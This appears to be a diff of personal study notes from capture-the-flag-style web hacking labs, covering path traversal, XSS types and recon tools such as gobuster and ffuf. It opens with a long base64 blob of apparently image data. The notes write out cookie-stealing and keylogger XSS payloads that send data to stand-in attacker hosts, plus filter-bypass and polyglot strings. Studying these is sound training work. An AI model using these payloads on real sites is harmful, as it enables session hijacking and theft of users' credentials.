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)"></div>
+- change selection avatar to private 
+  + permission denied 
+- try: x/../private , some path fun 
+  + ayo it worked 
+- inspect element, page data is in base64 - contains flag 
+**** XSS (Cross Site Scripting)
+Based on JS, Injection Attack 
+- Payload 
+  + The JS we wish to be executed on targets computer 
+  + 2 parts: Intention and Modification 
+- Intention
+  + What you wish the JS to actually do 
+  + Proof of Concept, when you simply want to prove you can achieve XSS, often done with an alert box 
+  + Session Stealing, getting details of user session, login tokens
+    - <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+  + Key Logger 
+    - <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+  + Business Logic: specific, calling a particular network resource or JS Function 
+- Modification 
+  + Changes to code we need to make it execute - as every scenerio is different
+***** Reflected XSS 
+Happens when user-supplied data in an HTTP request is included in the webpage source without any validation
+EX Scenerio: 
+- A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.
+  + <div class="alert alert-danger"> <p> Invalid Input Detected</p> </div> 
+- The application doesnt check the contents of the error parameter, which allows the attacker to insert malicious code 
+  + <div class="alert alert-danger"> <script src="https://attacker.thm/evil.js"></script> </div>
+- attacker sends a link to victim that contains a malicious payload 
+- victim clicks link taken to vulnerable site 
+- link containing attackers script is executed on website 
+- the data the attackers script gathered is sent to them, they could steal victims cookie - allow the attacker to take over victims account 
+- How to test for Reflected XSS:
+  + You'll need to test every possible point of entry; these include:
+    - Parameters in the URL Query String
+    - URL File Path
+    - Sometimes HTTP Headers (although unlikely exploitable in practice)
+    - Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
+***** Stored XSS 
+- XSS payload is stored in web application and then gets run when other users visit the site or webpage 
+- Blog website allows users to post comments, comments arent checked for JS or filter out any malicious code 
+- Post comment containing malicious JS - all vistors will then have it ran 
+- The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
+- How to test
+  - comments on blog 
+  - user profile information 
+  - website listings 
+***** DOM Based XSS 
+Document Object Model - Programming interface for HTML and XML documents. Represents the page so that programs can change the document structure, style and content. 
+- Exploiting 
+  + JS Code acts on input or user interaction 
+  + EX sites JS Gets contents from window.location.hash parameter then writes that onto the page in the currently being viewed section, contents of the hash arent checked for malicious code, allowing attacker to inject JS of their choosing onto the webpage 
+- Crafted links sent to potential victims 
+- Challenging to test for, requires knowledge of JS 
+  + look for window.location parameters  
+  + check how they are handled, maybe some one used an eval() somewhere 
+***** Blind XSS 
+Similar to stored XSS in that your payload gets stored on site for another user to view, but in this instance you cant see the payload working or be able to test it against yourself first 
+- EX: Website has contact form where you can message a member of staff, the message is unchecked for malicious code 
+- Impact, could call back to attackers website, revealing staff portal URL, staff members cookies and even the contents of the portal page that is being viewed, session hijack 
+- ensure payload has call back - so you know if code is being executed 
+- Popular tool for this is xsshunter 
+***** Exercises Regular 
+****** Level 1
+<script>alert('THM');</script>
+****** Level 2
+"><script>alert('THM');</script>
+****** Level 3 
+</textarea><script>alert('THM')</script>
+****** Level 4
+';alert('THM');//
+****** Level 5
+<sscriptcript>alert('THM');</sscriptcript>
+****** Level 6
+/images/cat.jpg" onload="alert('THM');
+****** XSS Polygot String 
+#+BEGIN_SRC JavaScript
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+#+END_SRC
+***** Exercise Blind 
+- Create account
+- Support ticket - bad input validation test 
+  + </textarea>test 
+- </textarea><script>fetch('http://638be9989cc55099f82e82bdfd4b09d5.log.tryhackme.tech?cookie=' + btoa(document.cookie) ); </script>
+catch with net cat or session catch thingy 
+** Tools
+*** Websites / web tools 
+- CT logs ( Certificate Transparency logs ), are publically accessible 
+    + http://crt.sh/ searchable DB  
+    + https://transparencyreport.google.com/https/certificates another searchable DB 
+https://wiki.owasp.org/index.php/OWASP_favicon_database
+https://crackstation.net/
+*** Wappalyzer 
+https://www.wappalyzer.com/
+Browser extension/ online tool that helps identify composition of site 
+- frameworks 
+- CMS 
+- payment processors 
+- AND MORE! 
+*** Gobuster 
+A website brute forcer 
+e.g 
+#+BEGIN_SRC sh 
+gobuster -u http://fakebank.com -w wordlist.txt
+#+END_SRC
+-u specifies url/website we are scanning 
+-w takes a wordlist and iterates through it 
+
+status 200 will indicate the location has been found 
+*** ffuf
+https://github.com/ffuf/ffuf
+similar to gobuster 
+#+BEGIN_SRC sh 
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ
+#+END_SRC
+-u url 
+-w wordlist 
+
+*** dirb 
+similar to ffuf and gobuster 
+#+BEGIN_SRC sh 
+user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+#+END_SRC
+
+*** dnsrecon 
+DNS bruteforcer 
+https://github.com/darkoperator/dnsrecon
+#+BEGIN_SRC sh
+dnsrecon -t brt -d site.url 
+#+END_SRC 
+
+*** sublist3r 
+https://github.com/aboul3la/Sublist3r
+python tool to enumerate subdomains using OSINT methods, uses search engines and sites Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.
+#+BEGIN_SRC sh
+./sublist3r.py -d acmeitsupport.thm
+#+END_SRC 
+* Lists 
+- SecList
+
+*** requestbin 
+HTTP logging tool to monitor requests, web based 
+https://requestbin.com 
+
+*** Burp Suites Collaborator Client 
+A lot to this, can monitor request 
+
+*** xsshunter 
